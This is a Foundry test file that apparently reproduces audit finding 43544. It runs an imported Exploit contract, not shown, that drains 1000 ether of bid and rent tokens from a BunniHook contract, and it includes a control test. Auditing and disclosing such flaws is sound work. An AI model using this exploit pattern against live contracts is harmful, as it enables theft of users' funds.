// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit} from "./43544-c-05-attacker-can-steal-bids-and-rent-tokens-from-bunnihook.sol";

contract Finding43544Test is Test {

    function test_exploit_sweeps_bids() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.stolen(), 1000 ether, "swept");
        assertEq(e.token().balanceOf(address(this)), 1000 ether, "attacker");
        assertEq(e.token().balanceOf(address(e.hook())), 0, "hook");
    }

    function test_control_received_zero_leaves_bids() public {
        Exploit e = new Exploit();
        uint256 got = e.hook().rebalanceReceived(address(e.token()), address(this), 0);
        assertEq(got, 0, "received");
        assertEq(e.token().balanceOf(address(e.hook())), 1000 ether, "bids stay");
        assertEq(e.token().balanceOf(address(this)), 0, "attacker");
    }

}
